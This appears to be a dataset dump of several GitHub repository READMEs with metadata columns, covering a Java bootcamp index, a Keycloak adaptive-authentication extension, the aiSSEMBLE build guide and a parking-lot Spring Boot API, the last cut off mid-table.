",5,0,1,0.0,"['jkscope', 'table', 'content', 'motivation', 'how', 'use', 'doc', 'jkscope', 'interface', 'method', 'letit', 'also', 'takeif', 'takeunless', 'letout', 'letopt', 'jkscope', 'static', 'method', 'run', 'runcatching', 'runrec', 'with', 'withint', 'withlong', 'withdouble', 'withresource', 'let', 'variation', 'opt', 'optnonnull', 'lazy', 'lazyofvalue', 'opt', 'object', 'lazy', 'object', 'unchecked', 'function', 'example', 'collection', 'initialization', 'argument', 'method', 'chain', 'nth', 'fibonacci', 'number', 'method', 'argument', 'processing', 'safe', 'resource']","['method', 'jkscope', 'opt', 'lazy', 'object']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:flatten-maven-plugin,org.jacoco:jacoco-maven-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,1.0,0.0
semih-turan/The-Full-Stack-Web-Development-Bootcamp,main,"# The-Full-Stack-Web-Development-Bootcamp

[![Patika+ TÃ¼rkiye'nin En KapsamlÄ± Web Developer Bootcamp'i](/readmeAssets/logo.png ""Patika+ TÃ¼rkiye'nin En KapsamlÄ± Web Developer Bootcamp'i"")](https://patika.dev)

## The Full Stack Web Development Bootcamp Repository on Patika +

This repository serves as an extensive compilation of the projects and practice sessions completed throughout my journey with Patika+. As I advance through the program, each project and practice session is thoughtfully arranged into specific folders within this repository.

## Purpose

This repository serves as a comprehensive record of my learning journey, designed to document progress and provide a reference point for personal reflection and potential collaboration. Through its centralized structure, I aim to create an organized and accessible archive of my coding pursuits.

---

### Table of Contents

#### Backend Phase

 <details>
<summary>Week 1 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 1       | 1  | [Grade Point Average Calculator](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/GradePointAverageCalculator)|
| 1       | 2  | [VAT Calculator](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/VATCalculator)|
| 1       | 3  | [Triangle Area](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/TriangleArea)|
| 1       | 4  | [Taxi Meter](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/TaxiMeter)|
| 1       | 5  | [Circle Area](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/CircleArea)|
| 1       | 6  | [Body Mass Index](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/BodyMassIndex)|
| 1       | 7  | [Green Grocer Calculator](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/GreenGrocerCalculator)|
| 1       | 8  | [Calculator](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Calculator)|
| 1       | 9  | [Login](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Login)|
| 1       | 10 | [Passing Grade](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/PassingGrade)|
| 1       | 11 | [Activity Recommendation](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/ActivityRecommendation)|
| 1       | 12 | [Horoscope](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Horoscope)|
| 1       | 13 | [Flight Ticket](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/FlightTicket)|
| 1       | 14 | [Chineese Zodiac](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Chinese%20Zodiac)|
| 1       | 15 | [Bissextile](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Bissextile)|
| 1       | 16 | [Even Numbers](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/EvenNumbers)|
| 1       | 17 | [Odd Numbers](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/OddNumbers)|
| 1       | 18 | [Power Scope](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/PowerScope)|
| 1       | 19 | [Combination](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Combination)|
| 1       | 20 | [Exponents](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Exponents)|
| 1       | 21 | [Digit Sum](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/DigitSum)|
| 1       | 22 | [Harmonic Series](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/HarmonicSeries)|
| 1       | 23 | [Diamond](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Diamond)|
| 1       | 24 | [ATM](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/ATM)|
| 1       | 25 | [GDC and LCM Calculator](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/GdcLcmCalculator)|
| 1       | 26 | [Find Biggest Number](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/FindBiggestNumber)|
| 1       | 27 | [Perfect Number](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/PerfectNumber)|
| 1       | 28 | [Inverted Triangle](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/InvertedTriangle)|
| 1       | 29 | [Prime Number](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/PrimeNumber)|
| 1       | 30 | [Fibonacci Series](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/FibonacciSeries)|
| 1       | 31 | [Precedence](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Precedence)|
| 1       | 32 | [Casting](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/01-WeekOne/Casting)|

</details>

<details>
<summary>Week 2 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 2       | 1  | [Polindrome](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/Polindrome)|
| 2       | 2  | [Advance Calculator](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/AdvanceCalculator)|
| 2       | 3  | [Recursive Exponential](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/RecursiveExponential)|
| 2       | 4  | [Recursive Prime Number](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/RecursivePrimeNumber)|
| 2       | 5  | [Recursive Pattern](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/RecursivePattern)|
| 2       | 6  | [Recursive Pattern Second](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/RecursivePatternSecond)|
| 2       | 7  | [Student Information System](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/StudentInformationSystem)|
| 2       | 8  | [Boxer Game](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/BoxerGame)|
| 2       | 9  | [Salary Calculator](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/SalaryCalculator)|
| 2       | 10 | [Harmonic Average](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/HarmonicAverage)||
| 2       | 11 | [Nearest Max Min](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/NearestMaxMin)|
| 2       | 12 | [PrintsB](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/PrintsB)|
| 2       | 13 | [Repeating Even Numbers](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/RepeatingEvenNumbers)|
| 2       | 14 | [Sorting Arrays](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/SortingArrays)|
| 2       | 15 | [Freq Arrays](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/FreqArrays)|
| 2       | 16 | [Matrix Transpose](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/MatrixTranspose)|
| 2       | 17 | [Guess Number](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/GuessNumber)|
| 2       | 18 | [Palindrome Words](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/02-WeekTwo/PalindromeWords)|
</details>

 <details>
<summary>Week 3 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 3       | 1  | [Mine Sweeper Game](https://github.com/semih-turan/Mine-Sweeper-Game)|

</details>

<details>
<summary>Week 4 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 4       | 1  | [Adventure Game](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/04-WeekFour/AdventureGame)|
| 4       | 2  | [List](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/04-WeekFour/List)|

</details>

<details>
<summary>Week 5 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 5       | 1  | [Try Catch Block](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/05-WeekFive/TryCatchBlock)|
| 5       | 2  | [Book Sorter](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/05-WeekFive/BookSorter)|
| 5       | 3  | [Word Frequency](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/05-WeekFive/WordFrequency)|
| 5       | 4  | [Patika Store](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/05-WeekFive/PatikaStore)|
| 5       | 5  |[SQL Assignments One](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/05-WeekFive/SQLAssignmentsOne)|

</details>

<details>
<summary>Week 6 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 6       | 1  |[SQL Assignments Two](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/06-WeekSix/SQLAssignmentsTwo)|
| 6       | 2  |[SQL Assignments Three](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/06-WeekSix/SQLAssignmentsThree)|
| 6       | 3  | [File Read Sum](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/06-WeekSix/FileReadSum)|
| 6       | 4  | [Notepad](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/06-WeekSix/Notepad)|
| 6       | 5  | [JDBCDB](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/06-WeekSix/JDBCDB)|

</details>

<details>
<summary>Week 7 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 7       | 1  |[Rent a Car](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/07-WeekSeven/RentACar)|


</details>

<details>
<summary>Week 8 Practices</summary>
<br>

- Feast of Ramadan
</details>


<details>
<summary>Week 9 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 9       | 1  | [Tourism Agency Management](https://github.com/semih-turan/Tourism-Agency-Management)|
</details>

<details>
<summary>Week 10 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 10       | 1  | [Tourism Agency Management](https://github.com/semih-turan/Tourism-Agency-Management)|
</details>

<details>
<summary>Week 11 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 11      | 1  |[Library Management System](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/11-WeekEleven/LibraryManagementSystem)|
</details>

<details>

<summary>Week 12 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 12      | 1  |[Library Management API](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/12-WeekTwelve/LibraryManagementAPI)|
</details>

<details>
<summary>Week 13 Practices</summary>
<br>

- Project Week

</details>

<details>
<summary>Week 14 Practices</summary>
<br>

- Project Week

</details>

<details>
<summary>Week 15 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 15     | 1  |[Veterinary Management System API](https://github.com/semih-turan/Veterinary-Management-System-API)|
</details>

#### Frontend Phase

<details>
<summary>Pre-Work</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| -       | 1  |[Pre-Work-Task](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/Pre-Work/Pre-Work-Task)|

</details>

<details>
<summary>Week 17 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 17       | 1  |[Working-with-Tables](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/17-WeekSeventeeth/Working-with-Tables)|
| 17       | 2  |[Form-Usage](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/17-WeekSeventeeth/Form-Usage)|
| 17       | 3  |[First-Web-Site](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/17-WeekSeventeeth/First-Web-Site)|
| 17       | 4  |[Personal-Blog](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/17-WeekSeventeeth/Personal-Blog)|
| 17       | 5  |[Dev-Site](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/18-WeekEighteenth/TributeWebsite)|


</details>

<details>
<summary>Week 18 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 18       | 1  |[Blog](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/18-WeekEighteeth/Blog)|
| 18       | 2  |[Tribute Website](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/18-WeekEighteeth/Blog)|
| 18       | 3  |[Registration Form](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/18-WeekEighteeth/RegistrationForm)|

</details>

<details>
<summary>Week 19 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 19       | 1  |[Blog](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/19-WeekNineteeth/InstagramClone)|
| 19       | 2  |[Blog](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/19-WeekNineteeth/Blog)|

</details>

<details>
<summary>Week 20 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 20       | 1  |[Landing Page](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/20-WeekTwentieth/LandingPage)|
| 20       | 2  |[Review Page](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/20-WeekTwentieth/ReviewPage)|

</details>

<details>
<summary>Week 21 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 21       | 1  |[Time and Greeting](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/21-WeekTwentyFirst/Time-and-Greeting)|
| 21       | 2  |[Drum Kit](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/21-WeekTwentyFirst/Drum-Kit)|

</details>

<details>
<summary>Week 22 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
| 22       | 1  |[To-Do App](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/22-WeekTwentySecond/to-do)|
| 22       | 2  |[Asian Kitchen](https://github.com/semih-turan/The-Full-Stack-Web-Development-Bootcamp/tree/main/22-WeekTwentySecond/asian-kitchen)|
</details>

<details>
<summary>Week 23 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
|23      | 1  |[Responsive Web App](https://github.com/semih-turan/Responsive-Web-App)|

</details>

<details open>
<summary>Week 24 Practices</summary>
<br>

|# of Week| #  | Practice Name|
|:---:    |---:|:----         |
|24      | 1  |[Sports Center](https://github.com/semih-turan/Sports-Center)|

</details>

---

### Usage Rights

All projects and practice exercises are freely available for use. You are welcome to explore, modify, and share them as you wish. If you have any questions, please don't hesitate to contact me.
",0,0,1,0.0,"['the', 'full', 'stack', 'web', 'development', 'bootcamp', 'repository', 'patika', 'purpose', 'table', 'content', 'backend', 'phase', 'practice', 'practice', 'practice', 'practice', 'practice', 'practice', 'practice', 'practice', 'practice', 'practice', 'practice', 'practice', 'frontend', 'phase', 'practice', 'practice', 'practice', 'practice', 'practice', 'practice', 'practice', 'practice', 'practice', 'usage', 'right']","['practice', 'phase', 'the', 'full', 'stack']",2.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,2.0,0.0
mabartos/keycloak-adaptive-authn,main,"![Keycloak](docs/img/keycloak-adaptive-colored.png)

# Keycloak Adaptive Authentication Extension

### Supported AI NLP Engines:

- **OpenAI ChatGPT** - (preview)
- **IBM Granite** - (experimental)

For more information, refer to the [README](adaptive/README.md) in `adaptive` module.

## Getting started

### Container

You can use the container image by running:

    podman run -p 8080:8080 quay.io/mabartos/keycloak-adaptive-all start

This command starts Keycloak exposed on the local port 8080 (`localhost:8080`).

In order to see the functionality in action, navigate to `localhost:8080/realms/authn-policy-adaptive/account`.

â„¹ï¸ **INFO:** If you want to use the OpenAI capabilities, set the environment variables (by setting `-e OPEN_AI_API_*`) for the image described in the [README](adaptive/README.md#integration-with-openai) of the `adaptive` module..

â„¹ï¸ **INFO:** If you have installed Docker, use `docker` instead of `podman`.

### Building from Source

To build from source every module, refer to particular READMEs, or follow [building and working with the code base](docs/building-source.md) guide.",0,13,7,1.0,"['keycloak', 'adaptive', 'authentication', 'extension', 'support', 'ai', 'nlp', 'engine', 'get', 'start', 'container', 'building', 'source']","['keycloak', 'adaptive', 'authentication', 'extension', 'support']",6.0,"[org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-resources-plugin,org.codehaus.mojo:exec-maven-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,4.0,2.0
boozallen/aissemble,dev,"# aiSSEMBLE&trade;
[![Documentation](https://img.shields.io/badge/documentation-GitHub_Pages-blue)](https://boozallen.github.io/aissemble/aissemble/current/index.html)
[![Maven Central](https://img.shields.io/maven-central/v/com.boozallen.aissemble/aissemble-root.svg)](https://search.maven.org/#search%7Cgav%7C1%7Cg%3A%22com.boozallen.aissemble%22%20AND%20a%3A%22aissemble-root%22)
![PyPI](https://img.shields.io/pypi/v/aissemble-foundation-core-python?logo=python&logoColor=gold)
![PyPI - Python Version](https://img.shields.io/pypi/pyversions/aissemble-foundation-core-python?logo=python&logoColor=gold)
[![Publish to GitHub Pages](https://github.com/boozallen/aissemble/actions/workflows/publish.yml/badge.svg)](https://github.com/boozallen/aissemble/actions/workflows/publish.yml)
## aiSSEMBLE Overview

### Purpose of the aiSSEMBLE

aiSSEMBLE is Booz Allen's lean manufacturing approach for holistically designing, developing and fielding
AI solutions across the engineering lifecycle from data processing to model building, tuning, and training to secure
operational deployment. This repository consists of standardized components which make it easy for dev teams to quickly
reuse and apply to their project to drive consistency, reliability and low delivery risk. aiSSEMBLE offers projects the
rapid generation of necessary scaffolding, boilerplate libraries, and container images with the flexibility of custom
configuration. It consists of pre-fabricated components that can be used as is within your projects and generated
capabilities that can be extended.

### Languages and frameworks used to implement aiSSEMBLE

Many languages can be useful across the full breadth of AI solutions. Currently, the following languages are leveraged:
* Data Delivery / Machine Learning Inference
    * Java
    * Python
* Machine Learning Training
    * Python

In addition, the following build tools and container frameworks are an important part of aiSSEMBLE:
* Fermenter MDA
* Maven
    * Habushu Maven Plugin (builds Python modules)
    * Orphedomos Maven Plugin (build Docker modules)
    * Helm Maven Plugin
* Kubernetes
* Helm

### Detailed Documentation

[aiSSEMBLE documentation is available GitHub pages](https://boozallen.github.io/aissemble).

### aiSSEMBLE Releases

aiSSEMBLE is currently released about once a month, but we intend to increase to around twice a month as we get our
processes adjusted and honed into the public GitHub

## Environment Configuration

Please consult our [Configuring Your Environment guidance](https://boozallen.github.io/aissemble/aissemble/current/configurations.html).

## Build

The following steps will build aiSSEMBLE. *You must follow the configuration guidance above first*.
1. To get started, pull the latest code for the aiSSEMBLE repo from git.
1. [Configure ghcr.io **authentication** SNAPSHOT repository support - **server configuration is all you need, you can ignore setting up a repository**](https://docs.github.com/en/packages/working-with-a-github-packages-registry/working-with-the-apache-maven-registry#authenticating-with-a-personal-access-token)
1. Ensure Rancher Desktop is running.
1. Build the project locally using the `./mvnw clean install` command.
    * A successful build will have an output similar to the below.
    ```
            [INFO] ------------------------------------------------------------------------
            [INFO] BUILD SUCCESS
            [INFO] ------------------------------------------------------------------------
            [INFO] Total time:  10:16 min
            [INFO] Finished at: 2021-09-09T10:01:10-04:00
            [INFO] ------------------------------------------------------------------------
    ```

### Helpful Profiles
The aiSSEMBLE baseline project provides several build profiles that may be helpful for different development environments.
To activate each one, use the standard Maven syntax: `./mvnw clean install -P[profile_name]`, for
instance, `./mvnw clean install -PnoRdAdmin`.  There are many profiles you can find in the root `pom.xml` file. The
following profiles are often useful when first starting with aiSSEMBLE:

* *noRdAdmin*: For configurations that disallow granting administrator privileges to Rancher Desktop. Testing frameworks
  leveraged by aiSSEMBLE may, at times, assume that the docker unix socket is located at `/var/run/docker.sock`, which is
  not the case when presented with a non-elevated Rancher installation.  Activating this profile will override the
  `DOCKER_HOST` seen by these dependencies, pointing it instead at `unix://$HOME/.rd/docker.sock`.
* *integration-test*: Some integration tests require Docker and automatically start/stop Docker Compose services while
  executing tests (i.e. see the test/test-mda-models/test-data-delivery-pyspark-patterns module). **Note that the Maven
  build does not build the Docker images directly. The images are built within the Kubernetes cluster to speed up
  development builds and save disk space.**

## Use a Maven Archetype to Create a New aiSSEMBLE-Based Project

The first step in creating a new project is to leverage Mavenâ€™s archetype functionality to incept a new Maven project
that will contain all of your aiSSEMBLE component implementations - Data Delivery and Machine Learning pipelines as
well as Path to Production modules.

Open a terminal to the location in which you want your project to live and execute the following command:
```
./mvnw archetype:generate \
    -DarchetypeGroupId=com.boozallen.aissemble \
    -DarchetypeArtifactId=foundation-archetype \
    -DarchetypeVersion=<version number>
 ```
This command will trigger an interactive questionnaire giving you the opportunity to enter the following information (in order):
1. groupId
2. artifactId
3. version
4. package
5. projectGitUrl
6. projectName

* For details on these fields refer to https://boozallen.github.io/aissemble/aissemble/current/archetype.html

* For detailed instructions on adding a pipeline refer to (LINK COMING SOON) https://boozallen.github.io/aissemble/current-dev/add-pipelines-to-build.html

## Troubleshooting

When executing the `aissemble` build for the first time, you may encounter the following transient error when building
the `test-data-delivery-pyspark-patterns` module:
```
:: problems summary
:::::: WARNINGS
                [NOT FOUND  ] org.apache.commons#commons-math3;3.2!commons-math3.jar (0ms)
         ==== local-m2-cache: tried           file:/Users/ekonieczny/.m2/repository/org/apache/commons/commons-math3/3.2/commons-math3-3.2.jar
                 ::::::::::::::::::::::::::::::::::::::::::::::
                 ::              FAILED DOWNLOADS            ::
                 :: ^ see resolution messages for details ^. ::
                 ::::::::::::::::::::::::::::::::::::::::::::::
                 :: org.apache.commons#commons-math3;3.2!commons-math3.jar
                 ::::::::::::::::::::::::::::::::::::::::::::::
:::: ERRORS
        SERVER ERROR: Bad Gateway url=https://dl.bintray.com/spark-packages/maven/org/sonatype/oss/oss-parent/9/oss-parent-9.jar
         SERVER ERROR: Bad Gateway url=https://dl.bintray.com/spark-packages/maven/org/antlr/antlr4-master/4.7/antlr4-master-4.7.jar
         SERVER ERROR: Bad Gateway url=https://dl.bintray.com/spark-packages/maven/org/antlr/antlr-master/3.5.2/antlr-master-3.5.2.jar
```
If this occurs, remove your local Ivy cache (`rm -rf ~/.ivy2`) and then manually download the dependency that failed to
download. Taking the above error message as an example, the following Maven command would download the needed commons-math3 jar:

`./mvnw org.apache.maven.plugins:maven-dependency-plugin:get -Dartifact=org.apache.commons:commons-math3:3.2`",6,31,13,218.0,"['aissemble', 'trade', 'aissemble', 'overview', 'purpose', 'aissemble', 'language', 'framework', 'use', 'implement', 'aissemble', 'detail', 'documentation', 'aissemble', 'release', 'environment', 'configuration', 'build', 'helpful', 'profile', 'use', 'maven', 'archetype', 'create', 'new', 'project', 'troubleshoot']","['aissemble', 'use', 'trade', 'overview', 'purpose']",165.0,"[${group.fabric8.plugin}:docker-maven-plugin,${group.helm.plugin}:helm-maven-plugin,com.bazaarvoice.maven.plugins:process-exec-maven-plugin,com.boozallen.aissemble:foundation-upgrade-plugin,com.boozallen.aissemble:mda-maven-plugin,com.google.code.maven-replacer-plugin:replacer,com.googlecode.maven-java-formatter-plugin:maven-java-formatter-plugin,io.quarkus:quarkus-maven-plugin,io.smallrye:jandex-maven-plugin,maven-antrun-plugin,maven-clean-plugin,maven-compiler-plugin,maven-dependency-plugin,maven-deploy-plugin,maven-failsafe-plugin,maven-resources-plugin,maven-surefire-plugin,net.masterthought:maven-cucumber-reporting,org.apache.maven.plugins:maven-archetype-plugin,org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-help-plugin,org.apache.maven.plugins:maven-install-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-plugin-plugin,org.apache.maven.plugins:maven-release-plugin,org.apache.maven.plugins:maven-scm-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:build-helper-maven-plugin,org.codehaus.mojo:buildnumber-maven-plugin,org.codehaus.mojo:exec-maven-plugin,org.codehaus.mojo:license-maven-plugin,org.eclipse.sisu:sisu-maven-plugin,org.jvnet.jaxb:jaxb-maven-plugin,org.sonatype.plugins:nexus-staging-maven-plugin,org.technologybrewery.baton:baton-maven-plugin,org.technologybrewery.fermenter:fermenter-mda,org.technologybrewery.habushu:habushu-maven-plugin,org.technologybrewery.orphedomos:orphedomos-maven-plugin]",0.0,49.0,44.0
Rapter1990/parkinglot,main,"# Case Study - Parking Lot

<p align=""center"">
    <img src=""screenshots/parking_lot_main_image.png"" alt=""Main Information"" width=""850"" height=""600"">
</p>

### ğŸ“– Information

<ul style=""list-style-type:disc"">
  <li><b>Parking Lot</b> is a <b>Spring Boot application</b> covering important and useful features related to managing parking areas, park check-ins and check-outs for drivers, user management, and vehicle management.</li> 
  <li>
    <b>Roles:</b>
    <ul>
      <li><b>Admin:</b> Users with administrative privileges.</li>
      <li><b>Driver:</b> Users with driver privileges.</li>
    </ul>
    <b>Explanation:</b>
    <ul>
      <li><b>AuthController:</b> API for authentication operations such as register, login, refresh token, and logout.</li>
      <li><b>ParkController:</b> APIs related to park check-ins and check-outs for <b>drivers</b>.</li>
      <li><b>ParkingAreaController:</b> APIs for managing parking areas, including creating, updating, and deleting parking areas, as well as retrieving parking area information and daily income handled with <b>admins</b></li>
      <li><b>UserController:</b> APIs for managing user information, including retrieving user information by ID for both <b>admins</b> and <b>drivers</b>.</li>
      <li><b>VehicleController:</b> APIs for managing vehicles, including assigning a vehicle to a user and retrieving parking details of a vehicle handled with <b>drivers</b>.</li>
    </ul>
  </li>
</ul>

### Explore Rest APIs

<table style=""width:100%"">
  <tr>
      <th>Method</th>
      <th>Url</th>
      <th>Description</th>
      <th>Request Body</th>
      <th>Header</th>
      <th>Valid Path Variable</th>
      <th>Request Param</th>
      <th>No Path Variable</th>
  </tr>
  <tr>
      <td>POST</td>
      <td>/register</td>
      <td>Register a new user (Admin and Driver)</td>
      <td>SignupRequest request</td>
      <td></td>
      <td></td>
      <td></td>
      <td></td>
  </tr>
  <tr>
      <td>POST</td>
      <td>/login</td>
      <td>Login user (Admin and Driver)</td>
      <td>LoginRequest request</td>
      <td></td>
      <td></td>
      <td></td>
      <td></td>
  </tr>
  <tr>
      <td>POST</td>
      <td>/refreshtoken</td>
      <td>Refresh token (Admin and Driver)</td>
      <td>TokenRefreshRequest request</td>
      <td></td>
      <td></td>
      <td></td>
      <td></td>
  </tr>
  <tr>
    <td>POST</td>
    <td>/logout</td>
    <td>Logout user (Admin and Driver)</td>
    <td></td>
    <td>Authorization header with Bearer token</td>
    <td></td>
    <td></td>
    <td></td>
  </tr>
